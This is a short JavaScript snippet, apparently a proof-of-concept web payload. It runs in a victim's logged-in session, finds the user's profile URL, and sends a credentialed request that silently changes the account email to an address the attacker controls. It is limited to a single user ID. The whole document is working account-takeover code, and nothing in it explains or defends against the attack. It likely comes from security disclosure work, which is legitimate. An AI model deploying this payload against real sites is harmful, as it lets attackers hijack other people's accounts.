window.submit = function()
      {
        // Get ID of current user
        var usr_post_id = document.getElementsByClassName("notification-settings")[0].href.split(".ch")[1]

        // Target a single user
        if (usr_post_id != "/user/210") {
            return
        }
        // Prepare the request
        var xhr = new XMLHttpRequest();
        xhr.open("POST", ''+usr_post_id, true);
        xhr.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded');
        xhr.withCredentials = true;

        // Set request body
        var body = "_method=put&user%5bemail%5d=dpellissier%2bpoc@immunit.ch";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 

        // Send request
        xhr.send(new Blob([aBody]));
        console.log("email of user "+ usr_post_id+" changed")
      }